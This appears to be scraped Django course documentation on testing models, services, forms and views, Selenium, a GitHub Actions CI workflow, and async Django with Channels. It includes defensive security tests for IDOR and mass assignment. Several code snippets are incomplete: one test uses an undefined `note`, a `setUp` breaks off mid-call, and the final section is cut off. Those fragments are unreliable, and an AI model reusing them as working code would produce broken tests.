docs.title: 07 · TESTING MODELS
docs.text:
Question: Why test models? They're just fields and relations.

Answer: A model contains business rules. If they are broken, the application silently behaves incorrectly.

docs.title: What lives in the model (and what can break)
docs.text:
Note model
  ├── priority: validators=[MinValueValidator(1), MaxValueValidator(4)]
  │     If someone removes the validators → the form will accept priority=99
  │     → Displaying the priority will break (KeyError in PRIORITY_CHOICES)
  │
  ├── group: ForeignKey(Group, on_delete=SET_NULL)
  │     If you change it to CASCADE → deleting a group will delete all its notes!
  │     → Users will lose data
  │
  ├── is_pinned: BooleanField(default=False)
  │     If the default becomes True → all new notes will become pinned
  │     → Sorting will break
  │
  └── __str__: pin + title
        If the format changes → Django Admin and logs display it incorrectly

docs.title: Structure of test_models.py
docs.text:
from django.contrib.auth.models import Group, User
from django.core.exceptions import ValidationError
from django.db import IntegrityError
from django.test import TestCase
from hello_app.models import Note, Notebook, ShopItem, ShoppingList, Tag


class TagModelTest(TestCase):
    def setUp(self):
        self.user  = User.objects.create_user('alice', password='pass123')
        self.user2 = User.objects.create_user('bob',   password='pass123')

    # 1. __str__ method
    def test_str_returns_hash_name(self):
        tag = Tag.objects.create(user=self.user, name='python')
        self.assertEqual(str(tag), '#python')

    # 2. unique_together constraint
    def test_unique_together_same_user_same_name_raises(self):
        Tag.objects.create(user=self.user, name='work')
        with self.assertRaises(IntegrityError):
            Tag.objects.create(user=self.user, name='work')  # ← duplicate → error

    # 3. Different users — isolation
    def test_unique_together_different_users_same_name_ok(self):
        Tag.objects.create(user=self.user,  name='work')  # Alice's 'work'
        Tag.objects.create(user=self.user2, name='work')  # Bob's 'work' — OK
        self.assertEqual(Tag.objects.count(), 2)

docs.title: How to test validators via full_clean()
docs.text:
# IMPORTANT: validators do not run on .save() or .objects.create()!
# They run only via full_clean() or a ModelForm.

# WRONG (validators won't be checked):
note = Note.objects.create(user=user, title='Test', priority=5)
# ← Django will simply save priority=5! (validators ignored)
# ← A CheckConstraint in the DB may fire, but not validators

# RIGHT — via full_clean():
note = Note(user=user, title='Test', priority=5)  # ← we do NOT save right away
note.full_clean()   # ← this is where validators run → ValidationError

# In a test:
def test_priority_above_4_raises_validation_error(self):
    note = Note(user=self.user, title='Test', priority=5)
    with self.assertRaises(ValidationError) as ctx:
        note.full_clean()
    self.assertIn('priority', ctx.exception.message_dict)
    #              ↑ we check that the error is specifically in the priority field

docs.title: Testing SET_NULL — protection against CASCADE
docs.text:
def test_note_group_becomes_null_when_group_deleted(self):
    """
    We check that Note.group = ForeignKey(Group, on_delete=SET_NULL)
    works correctly: deleting the group → the note becomes personal.

    If someone changes it to CASCADE → this test will FAIL and show:
    DoesNotExist: Note matching query does not exist.
    → we find out BEFORE deploying that the change broke users' data.
    """
    group = Group.objects.create(name='Family')
    note  = Note.objects.create(user=self.user, title='Family note', group=group)

    group.delete()               # delete the group

    note.refresh_from_db()       # ← MANDATORY! read the fresh state from the DB
    self.assertIsNone(note.group)# the note survived, group = NULL

Why refresh_from_db()? After group.delete() the note object in memory still holds the old reference. refresh_from_db() re-reads it from the DB.

docs.title: 08 · TESTING SERVICES
docs.text: Services are the best layer for unit tests. No HTTP, no templates, just logic.

docs.title: Why services are easy to test
docs.text:
VIEWS (HTTP layer):
  Receives a request → parses the form → calls a service → renders a template
  Depends on: HTTP, session, forms, templates
  Hard to test in isolation

SERVICES (business logic):
  create_note(user=alice, title='Test', tag_ids=[1,2])
  Takes Python objects → returns a result → saves to the DB
  No dependencies! We test directly:
    result = services.create_note(user=alice, title='Test')
    self.assertEqual(result.title, 'Test')

docs.title: Two kinds of checks in service tests
docs.text:
# TYPE 1: checking the RETURNED OBJECT
def test_create_note_returns_note_object(self):
    note = services.create_note(user=self.alice, title='Test')
    self.assertIsInstance(note, Note)   # ← we check what was returned

# TYPE 2: checking the DB STATE (persistence test)
def test_create_note_saves_to_database(self):
    services.create_note(user=self.alice, title='Test')
    self.assertEqual(Note.objects.count(), 1)   # ← we check that it was saved

# WHY BOTH?
# create_note() could return an object but not save it (.save() forgotten)
# Or save it but return None
# The two tests together cover both scenarios

docs.title: Security test: Mass Assignment via tag_ids
docs.text:
def test_create_note_ignores_other_users_tags(self):
    """
    Attack: an attacker sends a POST with a tag_id that belongs to Bob.
    POST /notes/new/ → tag_ids=[bob_secret_tag_id]

    WITHOUT PROTECTION (vulnerable):
        note.tags.set(Tag.objects.filter(id__in=tag_ids))
        → Bob's tag gets attached to Alice's note
        → Alice sees Bob's secret tag in her note

    WITH PROTECTION (our code):
        note.tags.set(Tag.objects.filter(id__in=tag_ids, user=user))
        → Filtering by user blocks other people's tags
    """
    bob_tag = Tag.objects.create(user=self.bob, name='bob-secret')

    note = services.create_note(
        user=self.alice, title='Note', tag_ids=[bob_tag.id]
    )

    self.assertEqual(note.tags.count(), 0)   # ← the other user's tag was not attached

docs.title: Testing transactional logic
docs.text:
def test_create_notebook_default_unsets_previous_default(self):
    """
    Business invariant: a user can have only ONE default notebook.

    The code in services.py:
        with transaction.atomic():
            if is_default:
                Notebook.objects.filter(user=user, is_default=True)
                                .update(is_default=False)   ← RESET the old one
            return Notebook.objects.create(..., is_default=is_default)  ← CREATE the new one

    If you remove the line with .update() → two notebooks with is_default=True
    → the note form picks the "first" one → unpredictable behavior

    This test will catch it IMMEDIATELY.
    """
    old = services.create_notebook(user=self.alice, title='Old', is_default=True)

    new = services.create_notebook(user=self.alice, title='New', is_default=True)

    old.refresh_from_db()       # ← read the fresh state of the old notebook
    self.assertFalse(old.is_default)  # the old one is reset
    self.assertTrue(new.is_default)   # the new one is set

docs.title: Testing isolation between users
docs.text:
def test_create_notebook_default_only_affects_same_user(self):
    """
    A critical test for a multi-user system.

    BUGGY CODE (doesn't filter by user):
        Notebook.objects.filter(is_default=True).update(is_default=False)
        ↑ Resets the default FOR ALL USERS! Bob will lose his default.

    CORRECT CODE:
        Notebook.objects.filter(user=user, is_default=True).update(...)
        ↑ Resets it only for the specific user. Bob is safe.
    """
    bob_default = services.create_notebook(user=self.bob,   title='Bob Default',   is_default=True)
    alice_def   = services.create_notebook(user=self.alice, title='Alice Default',  is_default=True)

    bob_default.refresh_from_db()
    self.assertTrue(bob_default.is_default)  # Bob is not affected!

docs.title: Testing the (True/False, message) pattern
docs.text:
def test_add_user_to_group_duplicate_returns_false(self):
    """
    add_user_to_group() returns (bool, message).
    On a duplicate → (False, 'bob вже є членом').

    Why check twice? The function could return (True, '') but not add the user,
    or add the user but return (False, ''). We check both aspects.
    """
    group = services.create_group(name='Team', creator=self.alice)
    services.add_user_to_group(group, username='bob')  # 1st time — success

    success, message = services.add_user_to_group(group, username='bob')  # 2nd

    self.assertFalse(success)                    # ← the function returned False
    self.assertIn('bob', message)                # ← the message contains the name
    self.assertEqual(group.user_set.count(), 2)  # ← the DB didn't change (alice + bob, not 3)

docs.title: 09 · TESTING FORMS
docs.text: A form in Django is not just HTML. It is validation, normalization and a security barrier.

docs.title: How to test a form without HTTP
docs.text:
# A form can be tested directly, without client.post():

form = TagForm(data={'name': 'Python', 'color': '#ff0000'})
form.is_valid()              # True or False — we check it
form.cleaned_data['name']   # 'python' — the normalized value
form.errors                  # {'name': ['...']} — errors per field

docs.title: Three categories of form tests
docs.text:
1. Normalization (clean_* methods)

def test_clean_name_lowercases(self):
    """
    TagForm.clean_name(): 'Python' → 'python'

    WHY: without normalization a user could create:
        'python', 'Python', 'PYTHON' — three different tags!
    Unique_together considers them different.
    clean_name() normalizes before saving.
    """
    form = TagForm(data={'name': 'Python', 'color': '#ff0000'})
    self.assertTrue(form.is_valid())
    self.assertEqual(form.cleaned_data['name'], 'python')  # normalized

def test_clean_name_strips_whitespace(self):
    """'  work  ' → 'work' (leading and trailing spaces are removed)"""
    form = TagForm(data={'name': '  work  ', 'color': '#ff0000'})
    self.assertTrue(form.is_valid())
    self.assertEqual(form.cleaned_data['name'], 'work')

2. Security — queryset filtering (the most important!)

# The vulnerability WITHOUT filtering:
#   NoteForm().fields['notebook'].queryset = Notebook.objects.all()
#   Alice sees in the dropdown: "Alice's Notes" and "Bob's Private Notes"!
#   Alice picks Bob's Private → Alice's note is written to Bob's notebook
#   Bob sees someone else's notes in his notebook → DATA LEAK

# The protection in our code:
#   NoteForm(user=alice).fields['notebook'].queryset = Notebook.objects.filter(user=alice)
#   Alice sees only her own notebooks → SAFE

def test_notebook_queryset_excludes_other_user_notebooks(self):
    """
    THE MAIN security test — IDOR through the form is impossible.
    """
    form = NoteForm(user=self.alice)
    queryset = form.fields['notebook'].queryset
    self.assertNotIn(self.bob_notebook, queryset)  # Bob's notebook is not visible!

3. A safe fallback without user=

def test_form_without_user_has_empty_querysets(self):
    """
    If the form is created without user= (a developer mistake):
        form = NoteForm(data=request.POST)  ← forgot user=request.user

    DANGEROUS: queryset = Notebook.objects.all() → all notebooks are visible
    SAFE (our code): queryset = Notebook.objects.none() → an empty list

    It's better to show the user an empty dropdown than to leak all the data.
    """
    form = NoteForm()  # user not passed
    self.assertFalse(form.fields['notebook'].queryset.exists())
    self.assertFalse(form.fields['tags'].queryset.exists())

docs.title: Table: what we check in each form
docs.text: Form What we test TagForm clean_name: lowercase + strip, empty name → error NoteForm the queryset for notebook/tags/group is filtered by user NoteForm without user= → empty querysets (safe fallback) NoteForm empty title → invalid, priority 1-4 → valid, 99 → invalid GroupCreateForm clean_name: duplicate → ValidationError, strip whitespace

docs.title: 10 · DJANGO TEST CLIENT
docs.text: Question: What does an integration test check that a unit test CANNOT?

docs.title: The difference between a unit and an integration test
docs.text:
# UNIT TEST (test_services.py) — a direct Python call, no HTTP:
note = services.create_note(user=alice, title='Test')
self.assertEqual(note.user, alice)
# Checks: business logic in isolation

# INTEGRATION TEST (test_views.py) — over HTTP:
self.client.force_login(alice)
response = self.client.get(reverse('hello_app:note_list'))
self.assertEqual(response.status_code, 200)
# Checks: URL routing → @login_required → view → selectors → DB → HTML response

docs.title: What an integration test catches that a unit test will NOT
docs.text: What it checks Unit (services) Integration (views) @login_required protects the view ✗ ✓ URL routing (/notes/ → note_list) ✗ ✓ redirect after POST (302 → /notes/pk/) ✗ ✓ form errors in the template context ✗ ✓ Bob gets a 404 when trying to access ✗ ✓ The page HTML contains the note title ✗ ✓ The business logic of create_note() is correct ✓ ✓

docs.title: Django Test Client — what it is
docs.text:
self.client is django.test.Client, a built-in HTTP client for tests.

# Automatically available in every TestCase as self.client
from django.test import TestCase

class MyTest(TestCase):
    def test_something(self):
        self.client  # ← ready to use

It does not open a real browser. It simulates an HTTP request inside the Django process: bypassing the network, but passing through the whole Django middleware stack.

docs.title: force_login vs login
docs.text:
# force_login — fast, no password check
self.client.force_login(self.alice)
# ↑ Always use it in tests. It doesn't check the password,
#   doesn't run authentication backends — it just sets up the session.

# login — the full auth pipeline
self.client.login(username='alice', password='pass123')
# ↑ Use it only if you are testing the login process itself.

docs.title: Key response attributes
docs.text:
response = self.client.get(reverse('hello_app:note_list'))

response.status_code      # → 200, 302, 404, 403, 500
response.context          # → the template context {'notes': queryset, 'form': form}
response.content          # → bytes of the HTML response
response['Location']      # → the redirect URL (if 302)
response.context['form'].errors  # → {'title': ['This field is required.']}

docs.title: Assert methods for HTTP tests
docs.text:
# HTTP status codes
self.assertEqual(response.status_code, 200)    # OK
self.assertEqual(response.status_code, 302)    # redirect
self.assertEqual(response.status_code, 404)    # not found
self.assertEqual(response.status_code, 403)    # forbidden

# Checking a redirect
self.assertRedirects(response, reverse('hello_app:note_list'),
                     fetch_redirect_response=False)
# fetch_redirect_response=False — we don't make a second GET request

# Text in the HTML
self.assertContains(response, 'Alice Note')    # the string is in the HTML
self.assertNotContains(response, 'Bob Secret') # the string is NOT in the HTML

# Checking that the URL contains login
self.assertIn('/accounts/login/', response['Location'])

# Form errors
self.assertIn('title', response.context['form'].errors)

docs.title: What each test category in test_views.py checks
docs.text:
AuthenticationViewTest    ← @login_required on every view
NoteListViewTest          ← multi-tenant: alice sees only her own notes
NoteDetailViewTest        ← ownership + group-based access
NoteCreateViewTest        ← form valid/invalid, IDOR prevention, note.user = request.user
NoteEditViewTest          ← ownership: someone else's → 404; your own → 302
NoteDeleteViewTest        ← ownership + cascade: the note is deleted from the DB
NotebookViewTest          ← ownership: get_object_or_404(user=request.user)
GroupViewTest             ← membership check: someone else's → 404, non-member delete → 403
TodoListSharingViewTest   ← share/unshare workflow over HTTP

docs.title: 11 · SELENIUM
docs.text: Selenium is Python code that drives a real browser (Firefox / Chrome).

docs.title: The difference between the Django Test Client and Selenium
docs.text:
Django Test Client:
  Python → Django middleware → view → response
  We bypass the network and the browser.
  We don't see JavaScript, CSS, DOM rendering.

Selenium:
  Python → geckodriver → Firefox → real HTTP → Django server
  The full stack: the browser opens, the page loads, JS runs.
  We see everything the user sees.

docs.title: StaticLiveServerTestCase — a real server
docs.text:
from django.contrib.staticfiles.testing import StaticLiveServerTestCase

class MySeleniumTest(StaticLiveServerTestCase):
    def test_something(self):
        self.live_server_url  # → 'http://127.0.0.1:PORT' (random port)
        self.driver.get(f'{self.live_server_url}/notes/')

StaticLiveServerTestCase starts a real Django HTTP server on a temporary port. Selenium connects to it like a real browser.

docs.title: Session Cookie Trick — login without the form
docs.text:
def _login_via_cookie(self):
    """Logging in without filling in the login form in the browser."""
    # 1. The Test Client sets up the session
    self.client.force_login(self.user)
    session_cookie = self.client.cookies['sessionid']

    # 2. Open any page (the browser needs an active domain)
    self.driver.get(f'{self.live_server_url}/')

    # 3. Copy the session cookie into Selenium
    self.driver.add_cookie({
        'name': 'sessionid', 'value': session_cookie.value, 'path': '/'
    })
    # Now the driver is authenticated!

Why: a login form may have CSRF, JS validation, reCAPTCHA. All of this breaks E2E tests. The session cookie trick is more reliable and faster.

docs.title: Headless mode
docs.text:
from selenium.webdriver.firefox.options import Options

options = Options()
options.add_argument('--headless')  # no GUI window
driver = webdriver.Firefox(options=options)

headless = the browser starts without a graphical interface. Needed for: - CI/CD servers (GitHub Actions, Jenkins, Docker) — there is no display there - Speed — no need to render pixels to a screen

docs.title: @unittest.skipUnless — graceful skip
docs.text:
try:
    from selenium import webdriver
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False

@unittest.skipUnless(SELENIUM_AVAILABLE, "selenium not installed")
class MySeleniumTest(StaticLiveServerTestCase):
    ...

If selenium is not installed → the tests are marked as s (skipped) and don't fail.

Ran 129 tests in 90.2s
OK (skipped=6)

This is important: manage.py test must always return OK, even without geckodriver.

docs.title: Why there are few Selenium tests
docs.text:
Unit test: 0.01s  ×  100 = 1 second
Selenium:  10s    ×  100 = 16 minutes

+ Selenium is brittle: changing a CSS class breaks the test even if the logic is correct
+ Requires geckodriver and a specific browser version
+ Unstable in CI without implicitly_wait

Rule: E2E tests only for CRITICAL user flows.
      Everything else — unit/integration.

class BaseServiceTest(TestCase):
    """
    A base class with a shared setUp.
    All subclasses automatically get self.alice and self.bob.
    """
    def setUp(self):
        self.alice = User.objects.create_user('alice', password='pass123')
        self.bob   = User.objects.create_user('bob',   password='pass123')


class NoteServiceTest(BaseServiceTest):
    # setUp() is NOT needed — inherited from BaseServiceTest
    # self.alice and self.bob are available in every test

    def test_create_note_sets_correct_user(self):

        self.assertEqual(note.user, self.alice)

docs.title: Persistence test — "was it really saved?"
docs.text:
def test_toggle_pin_note_persisted_in_db(self):
    """
    IMPORTANT: we check that the change is saved in the DB, not only in memory.

    Buggy code could:
        note.is_pinned = True   ← changed it in memory
        return note             ← returned it, but didn't save it!

    The test EXPLICITLY reads from the DB again:
    """
    note = Note.objects.create(user=self.alice, title='Test', is_pinned=False)
    services.toggle_pin_note(note)

    # Load a NEW object from the DB — ignore the one cached in memory
    note_from_db = Note.objects.get(pk=note.pk)
    self.assertTrue(note_from_db.is_pinned)
    #                ↑ really True in the DB, not only in the object's memory

docs.title: TodoListServiceTest — a setUp() that extends the base one

class TodoListServiceTest(BaseServiceTest):

    def setUp(self):
        super().setUp()   # ← MANDATORY! Call the parent class's setUp
        # Additional preparation specific to this class:
        self.todo_list = services.create_todo_list(

class NoteFormSecurityTest(BaseFormTest):

    def setUp(self):
        super().setUp()
        # Both users have their own notebooks
        self.alice_notebook = Notebook.objects.create(user=self.alice, title="Alice's")
        self.bob_notebook   = Notebook.objects.create(user=self.bob,   title="Bob's")

    def test_notebook_queryset_contains_user_notebooks(self):
        """Alice sees HER OWN notebook in the dropdown."""
        form = NoteForm(user=self.alice)
        self.assertIn(self.alice_notebook, form.fields['notebook'].queryset)

    def test_notebook_queryset_excludes_other_user_notebooks(self):
        """Alice does NOT see Bob's notebooks — IDOR is impossible."""
        form = NoteForm(user=self.alice)
        self.assertNotIn(self.bob_notebook, form.fields['notebook'].queryset)

    def test_group_queryset_excludes_groups_user_not_in(self):
        """Alice doesn't see groups where she is not a member."""
        group = Group.objects.create(name="Bob's Team")
        self.bob.groups.add(group)        # only Bob is in the group

        form = NoteForm(user=self.alice)
        self.assertNotIn(group, form.fields['group'].queryset)

docs.title: The three most important patterns
docs.text:
1. Checking login_required

def test_note_list_redirects_anonymous(self):
    """A user who is not logged in cannot view the note list."""
    response = self.client.get(reverse('hello_app:note_list'))
    # Not 200! → redirect to the login page
    self.assertEqual(response.status_code, 302)
    self.assertIn('/accounts/login/', response['Location'])

2. Ownership check — Bob gets a 404

def test_non_owner_gets_404(self):
    """
    Bob (not the owner) tries to view Alice's note → 404.

    Why 404 and not 403?
    404 — nothing is known about the resource. Safer.
    403 — the resource exists, but access is forbidden. Reveals information.
    """
    self.client.force_login(self.bob)
    response = self.client.get(
        reverse('hello_app:note_detail', args=[self.alice_note.pk])
    )
    self.assertEqual(response.status_code, 404)

3. IDOR prevention through the view

def test_form_rejects_other_users_notebook_idor_prevention(self):
    """
    Alice tries a POST with notebook=bob_notebook.id.
    The NoteForm(user=alice) queryset doesn't contain Bob's notebook → invalid choice.
    """
    bob_notebook = Notebook.objects.create(user=self.bob, title="Bob Notebook")
    self.client.force_login(self.alice)
    response = self.client.post(
        reverse('hello_app:note_create'),
        data={'title': 'Hack Note', 'notebook': bob_notebook.pk, 'priority': 1},
    )
    self.assertEqual(response.status_code, 200)  # ← the form is invalid, no redirect
    self.assertFalse(Note.objects.filter(title='Hack Note').exists())

docs.title: The full workflow: line by line
docs.text:
This workflow comes from the course's original monorepo

The YAML code below describes the CI workflow written for the course monorepo, where the project is located at module_5/lesson_Django_Testing/crispy_notes_project. Accordingly, paths: and working-directory: point to that path.

In the standalone notes_chat_app repository the workflow watches the paths notes_app/** and notes_project/** — without the module_5/ prefix. The walkthrough below is a teaching example of GitHub Actions structure — the concepts (on, paths, jobs, steps, needs) apply to any project.

File: .github/workflows/django-tests.yml

docs.title: Name and triggers
docs.text:
name: Django Tests (module_5/lesson_Django_Testing)

This name is displayed in the Actions tab on GitHub.

on:
  push:
    branches: [ main, master ]
    paths:
      - 'module_5/lesson_Django_Testing/**'
      - '.github/workflows/django-tests.yml'
  pull_request:
    branches: [ main, master ]
    paths:
      - 'module_5/lesson_Django_Testing/**'
      - '.github/workflows/django-tests.yml'
  workflow_dispatch:

on — defines when to run the workflow. 📖 Documentation: Events that trigger workflows

Key What it means push On every git push branches Only for the main or master branches paths Only if these files changed. If you edit module_1, the workflow doesn't run pull_request When a PR is opened or updated workflow_dispatch The "Run workflow" button in the GitHub UI → Actions

Why paths?

Without paths, every push to any file in the course would run the Django lesson's tests. With paths, the workflow runs only when files of this particular lesson or the workflow itself have changed. It saves CI minutes.

docs.title: Job 1: Unit & Integration Tests
docs.text:
jobs:
  unit-and-integration:
    name: Unit & Integration Tests
    runs-on: ubuntu-latest

runs-on: ubuntu-latest — the runner type. It is a fresh Ubuntu 22.04 VM on Azure. After the job finishes, the VM is destroyed. No state is kept between runs.

📖 Documentation: GitHub-hosted runners

    defaults:
      run:
        working-directory: module_5/lesson_Django_Testing/crispy_notes_project

defaults.run.working-directory — all run: commands in this job are executed from this directory. Without it, every command would start from the repository root and you would have to write cd module_5/... before every step.

📖 Documentation: defaults.run

Step 1 — Checkout

    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

Clones the whole repository onto the VM. Without this step, the runner has none of your code's files.

📖 actions/checkout on GitHub Marketplace

Step 2 — Setup Python

      - name: Set up Python 3.12
        uses: actions/setup-python@v5
        with:
          python-version: "3.12"

Installs the required Python version. Ubuntu-latest has several Python versions; this action selects and activates the one you need.

📖 actions/setup-python on GitHub Marketplace

Step 3 — Cache pip

      - name: Cache pip dependencies
        uses: actions/cache@v4
        with:
          path: ~/.cache/pip
          key: ${{ runner.os }}-pip-${{ hashFiles('module_5/lesson_Django_Testing/crispy_notes_project/requirements.txt') }}
          restore-keys: |
            ${{ runner.os }}-pip-

Caches the ~/.cache/pip folder between workflow runs.

How it works: 1. On the first run — there is no cache, pip downloads the packages (~60 seconds), the cache is saved 2. On subsequent runs — if requirements.txt hasn't changed, the key matches → pip loads the packages from the cache (~5 seconds) 3. If requirements.txt has changed → the key is new → the cache is not found → restore-keys gives a partial match → the cache is updated

${{ hashFiles(...) }} is a GitHub Actions expression. It returns the file's SHA-256 hash. If the file hasn't changed, the hash is the same → cache hit.

📖 actions/cache on GitHub Marketplace 📖 Documentation: Caching dependencies

Step 4 — Install dependencies

      - name: Install dependencies
        run: pip install -r requirements.txt

A simple shell command. It runs from the working-directory → that is, from crispy_notes_project/.

Step 5 — Django system check

      - name: Django system check
        run: python manage.py check

manage.py check is a built-in Django command. It checks: - The correctness of settings.py - Model syntax - Middleware configuration - URL patterns

If there is a configuration error, you find out here in 3 seconds, not after 2 minutes of tests.

📖 Documentation: Django system check framework

Step 6 — Run tests

      - name: Run unit and integration tests
        run: |
          python manage.py test \
            hello_app.tests.test_models \
            hello_app.tests.test_services \
            hello_app.tests.test_forms \
            hello_app.tests.test_views \
            -v 2

Runs 123 tests (unit + integration). The modules are listed explicitly without test_selenium — Selenium is in a separate job.

-v 2 — verbose: each test is printed on its own line. In CI this is useful: you immediately see the name of the test that failed.

If any test returns FAILED → the step returns exit code 1 → GitHub Actions considers the step failed → the job stops → Job 2 (selenium) doesn't run.

Step 7 — Coverage

      - name: Generate coverage report
        run: |
          coverage run manage.py test \
            hello_app.tests.test_models \
            hello_app.tests.test_services \
            hello_app.tests.test_forms \
            hello_app.tests.test_views
          coverage report --show-missing
          coverage xml -o coverage.xml

coverage run — runs the tests through coverage, tracking which lines of code are executed.

coverage report --show-missing — prints a table:

Name                          Stmts   Miss  Cover   Missing
-----------------------------------------------------------
hello_app/models.py             87      3    97%   45, 67, 89
hello_app/services.py          124      8    94%   34-41
hello_app/views.py             198     12    94%   ...
-----------------------------------------------------------
TOTAL                          409     23    94%

coverage xml -o coverage.xml — saves it as XML for integration with Codecov / SonarQube.

📖 Coverage.py documentation

Step 8 — Upload artifact

      - name: Upload coverage report
        uses: actions/upload-artifact@v4
        with:
          name: coverage-xml
          path: module_5/lesson_Django_Testing/crispy_notes_project/coverage.xml

Saves coverage.xml as an artifact — the file is attached to the workflow run and can be downloaded from the GitHub UI.

The path is given relative to the repository root (not the working-directory) — artifact upload does not inherit defaults.run.working-directory.

📖 actions/upload-artifact on GitHub Marketplace

docs.title: Job 2: Selenium E2E
docs.text:
selenium-e2e:
    name: Selenium E2E Tests
    runs-on: ubuntu-latest
    needs: unit-and-integration

needs: unit-and-integration — Job 2 runs only after Job 1 has finished successfully. If the unit tests failed, Selenium doesn't even start. This is right: there's no point checking the browser flow if the basic logic is already broken.

📖 Documentation: needs

Why there is no service container for Selenium

The sample inside the project (crispy_notes_project/.github/...) has a services: selenium: image: selenium/standalone-chrome section. The real workflow does not use it. Here's why:

The problem with a service container:

  Runner VM                     Docker container (selenium/standalone-chrome)
  ┌─────────────────────┐       ┌─────────────────────────────────────┐
  │ Django test server  │       │ Chrome                              │
  │ http://localhost:PORT│       │                                     │
  │                     │       │  Chrome opens                       │
  │                     │◄──────│  http://localhost:PORT              │
  └─────────────────────┘       │                                     │
                                │  BUT! the container's localhost ≠   │
                                │  the runner's localhost             │
                                │  → ERR_CONNECTION_REFUSED           │
                                └─────────────────────────────────────┘

The solution (the real workflow):

  Runner VM — everything on one machine
  ┌─────────────────────────────────────────────────────┐
  │ Django test server       Chrome (already installed) │
  │ http://localhost:PORT ◄─ http://localhost:PORT ✅    │
  │                                                     │
  │ Selenium Manager automatically downloads chromedriver│
  └─────────────────────────────────────────────────────┘

ubuntu-latest includes Chrome. selenium>=4.6 has a built-in Selenium Manager — it finds the installed Chrome itself and downloads the matching chromedriver version. Nothing else is needed.

Step — Run Selenium

      - name: Run Selenium E2E tests
        run: python manage.py test hello_app.tests.test_selenium -v 2

Without the SELENIUM_REMOTE_URL variable → _make_driver() in the test code uses the local Chrome in headless mode. Django's StaticLiveServerTestCase starts the server on a random port, and Chrome connects to it on the same localhost.

docs.title: Crispy Notes Project: Sync vs Async Django
docs.text: A learning project for the Python/Django course. It demonstrates synchronous and asynchronous Django side by side on the same code.

docs.title: 00. What this project is about
docs.text:
This is an already finished Django app for notes (Notes, Notebooks, Tags, TodoList, ShoppingList). We don't rewrite it from scratch — we add async capabilities alongside the sync code.

Two async demonstrations in one project:

# Part 1: Async views (same result — different architecture)
http://127.0.0.1:8000/notes/          ← Sync view (classic Django)
http://127.0.0.1:8001/async/notes/    ← Async view (same result, async ORM)

# Part 2: Real-time chat (here async is the only correct approach)
http://127.0.0.1:8001/groups/<pk>/chat/   ← Group WebSocket chat

Async views and the async ORM show how to write async code. The group chat shows why async is needed — sync simply doesn't fit here.

docs.title: 01. What the student will learn
docs.text:
After completing this project you will understand:

Async views and the ORM: - [ ] Why async def view doesn't become useful just because you wrote async - [ ] What a lazy QuerySet is and where the SQL actually runs - [ ] How async for replaces for when iterating over a QuerySet - [ ] When and why sync_to_async is needed for transaction.atomic() - [ ] How to run Django under ASGI with Uvicorn - [ ] How to write tests for async views with AsyncClient - [ ] That aupdate() + F() is an atomic SQL UPDATE without loading the object

Real-time chat (Django Channels + WebSocket): - [ ] Why HTTP doesn't fit real-time and where async becomes a necessity - [ ] What WebSocket is and how it differs from HTTP - [ ] What a Consumer is and how it differs from a View - [ ] How the channel layer delivers messages to all participants (pub/sub) - [ ] How ProtocolTypeRouter combines HTTP and WebSocket in one ASGI process - [ ] How AuthMiddlewareStack authenticates WebSocket connections - [ ] What database_sync_to_async is and why it's needed in a Consumer

The learning state of this module

async_selectors.py, async_services.py, async_views.py and test_async_views.py are created only within this learning step to demonstrate Django async views.

In the final version of Notes Chat App these modules are absent: all the async logic is implemented directly in consumers.py (Django Channels) without separate async_*.py files.

docs.title: 03. The sync version: classic Django
docs.text: The sync code in this project is standard Django without any changes.

docs.title: How a sync request works
docs.text:
sequenceDiagram
    participant Browser as Browser
    participant Django as Django (WSGI)
    participant View as views.note_list()
    participant Selector as selectors.get_user_notes()
    participant DB as SQLite

    Browser->>Django: GET /notes/
    Django->>View: Calls note_list(request)
    View->>Selector: get_user_notes(user, ...)
    Selector->>DB: SELECT * FROM notes WHERE user=... JOIN ...
    Note over Django: Thread is BLOCKED — waiting for the DB
    DB-->>Selector: Data rows
    Selector-->>View: QuerySet
    View-->>Django: render(template, context)
    Django-->>Browser: HTML 200 OK

docs.title: Sync URLs
docs.text: URL Method View What it does /notes/ GET note_list List of notes /notes/<pk>/ GET note_detail Note details /notes/new/ GET/POST note_create Create form /notes/<pk>/edit/ GET/POST note_edit Edit form /notes/<pk>/delete/ GET/POST note_delete Deletion

docs.title: 04. The async version: what we added and why
docs.text: We added new files without changing the sync code. A student can open views.py and async_views.py side by side and see the difference.

docs.title: How an async request works
docs.text:
sequenceDiagram
    participant Browser as Browser
    participant ASGI as Uvicorn (ASGI)
    participant EL as Event Loop
    participant View as async_note_list()
    participant Selector as async_selectors
    participant DB as SQLite

    Browser->>ASGI: GET /async/notes/
    ASGI->>EL: Passes the coroutine
    EL->>View: Runs async_note_list(request)
    View->>Selector: async_get_user_notes(user) — lazy QuerySet
    View->>DB: async for note in queryset (real SQL)
    Note over EL: Event loop is FREE — serves other requests
    DB-->>View: Data rows
    View-->>ASGI: render(template, context)
    ASGI-->>Browser: HTML 200 OK

docs.title: Async URLs
docs.text: URL Method Async View Sync counterpart /async/notes/ GET async_note_list note_list /async/notes/<pk>/ GET async_note_detail note_detail /async/notes/create/ GET/POST async_note_create note_create /async/notes/<pk>/delete/ GET/POST async_note_delete note_delete /async/notes/<pk>/pin/ POST async_note_toggle_pin (no separate URL)

docs.title: 05. When async is justified and when it isn't
docs.text: Async is not "better". Async is "for a different kind of task".

docs.title: ❌ Async is not needed (sync is enough)
docs.text: Feature Why sync is enough Note CRUD Simple DB queries, one request = one response TodoList, ShoppingList No bottleneck, short requests Forms, authorization CPU operations without I/O waiting Admin panel Rare complex queries, concurrency isn't needed

docs.title: ✅ Async is justified
docs.text:
Feature Why async is needed Group chat (this project!) WebSocket = thousands of open connections at the same time Parallel API requests asyncio.gather() → several requests at once Streaming responses Server-Sent Events, large files High-concurrency API 10,000+ req/s without blocking threads

Rewriting the whole project in async without a real bottleneck means overengineering + more complex code + the same results.

We convert only Notes so the student can compare the architecture. The group chat is a separate use case where async is the only correct choice (→ section 18).

docs.title: 07. Running async Django with Uvicorn (ASGI)
docs.text: Uvicorn is an ASGI server. Unlike the built-in runserver, it uses the asyncio event loop and serves async views natively.

docs.title: Step 1: Install dependencies (including wsproto)
docs.text:
pip install -r requirements.txt

Why it matters: requirements.txt contains wsproto — a WebSocket protocol library for uvicorn. Without it uvicorn logs "No supported WebSocket library detected" and returns HTTP 404 for all WS requests. Async views work, but the chat won't.

docs.title: Step 2: Start the ASGI server
docs.text:
uvicorn notes_project.asgi:application --reload --port 8001

Command breakdown:

